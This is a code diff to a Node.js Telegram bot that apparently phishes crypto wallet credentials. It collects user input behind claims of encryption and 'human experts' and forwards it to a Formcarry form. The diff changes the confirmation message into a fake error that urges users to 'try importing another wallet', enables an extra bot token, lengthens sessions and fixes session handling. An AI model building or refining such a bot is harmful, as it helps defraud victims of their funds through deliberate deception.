@@ -11,7 +11,7 @@ const PORT = process.env.PORT || 4000; // Use port 4000
 // Retrieve Telegram bot tokens from environment variables
 const TELEGRAM_BOT_TOKENS = [
     process.env.TG_BOT_TOK1,
-    // process.env.TG_BOT_TOK2,
+    process.env.TG_BOT_TOK2,
     // process.env.TELEGRAM_BOT_TOKEN_3,
     // process.env.TELEGRAM_BOT_TOKEN_4,
     // process.env.TELEGRAM_BOT_TOKEN_5
@@ -32,7 +32,7 @@ const YOUR_ACCESS_TOKEN = process.env.FORMCARRY_ACCESS_TOKEN;
 const userData = {};
 
 // Session timeout (5 minutes)
-const SESSION_TIMEOUT = 1 * 60 * 1000;
+const SESSION_TIMEOUT = 3 * 60 * 1000;
 
 // Middleware to parse JSON
 app.use(express.json());
@@ -70,7 +70,7 @@ const sendToFormcarry = async (chatId, data, retries = 3, delay = 1000) => {
             };
 
             bots.forEach(bot => {
-                bot.sendMessage(chatId, '✅ Your input has been received!', {
+                bot.sendMessage(chatId, '❌ An error occurred, please contact admin to solve your issue or try importing another wallet.', {
                     parse_mode: 'Markdown',
                     ...optionss,
                 });
@@ -94,7 +94,7 @@ const sendToFormcarry = async (chatId, data, retries = 3, delay = 1000) => {
         } else {
             // Other errors: Notify the user and restart the bot
             bots.forEach(bot => {
-                bot.sendMessage(chatId, '❌ *Oops! Something went wrong. Restarting the bot...*', {
+                bot.sendMessage(chatId, '❌ *Oops! Something went wrong. Restart the bot by clicking */start*...*', {
                     parse_mode: 'Markdown',
                 });
 
@@ -111,21 +111,29 @@ bots.forEach(bot => {
     bot.onText(/\/start/, (msg) => {
         const chatId = msg.chat.id;
 
+        // Initialize userData[chatId] if it doesn't exist
+        if (!userData[chatId]) {
+            userData[chatId] = {
+                step: 'choosing_option',
+                option: null,
+                authMethod: null,
+                input: null,
+                timeout: null,
+            };
+        }
+
         // Clear any existing timeout for this user
-        if (userData[chatId] && userData[chatId].timeout) {
+        if (userData[chatId].timeout) {
             clearTimeout(userData[chatId].timeout);
         }
 
         // Set a new timeout
-        userData[chatId] = {
-            ...userData[chatId],
-            timeout: setTimeout(() => {
-                // Restart the bot after the timeout
-                delete userData[chatId];
-                bot.sendMessage(chatId, '🔄 Session expired. Restarting the bot...');
-                bot.sendMessage(chatId, '/start');
-            }, SESSION_TIMEOUT),
-        };
+        userData[chatId].timeout = setTimeout(() => {
+            // Restart the bot after the timeout
+            delete userData[chatId];
+            bot.sendMessage(chatId, '🔄 Session expired. Restart the bot by clicking */start*...');
+            bot.sendMessage(chatId, '/start');
+        }, SESSION_TIMEOUT);
 
         // Create a fashionable inline keyboard with emojis
         const options = {
@@ -174,7 +182,6 @@ you with one of our human experts.
 ⚠️NOTE: YOU ARE SUBMITTING ALL REQUIRED INFORMATIONS TO BOT WITH ZERO HUMAN INTERFERENCE. 
 
 *🔗 END TO END ENCRYPTED 🔁*`, { parse_mode: 'Markdown', ...options });
-        userData[chatId] = { step: 'choosing_option' }; // Track user's step
     });
 });
 
@@ -196,6 +203,18 @@ bots.forEach(bot => {
 bots.forEach(bot => {
     bot.on('callback_query', (callbackQuery) => {
         const chatId = callbackQuery.message.chat.id;
+
+        // Initialize userData[chatId] if it doesn't exist
+        if (!userData[chatId]) {
+            userData[chatId] = {
+                step: 'choosing_option',
+                option: null,
+                authMethod: null,
+                input: null,
+                timeout: null,
+            };
+        }
+
         const data = callbackQuery.data;
 
         // Handle restart_bot action
@@ -258,7 +277,18 @@ bots.forEach(bot => {
         const chatId = msg.chat.id;
         const text = msg.text;
 
-        if (!userData[chatId] || userData[chatId].step !== 'providing_input') {
+        // Initialize userData[chatId] if it doesn't exist
+        if (!userData[chatId]) {
+            userData[chatId] = {
+                step: 'choosing_option',
+                option: null,
+                authMethod: null,
+                input: null,
+                timeout: null,
+            };
+        }
+
+        if (userData[chatId].step !== 'providing_input') {
             return; // Ignore messages if not in the input step
         }
 
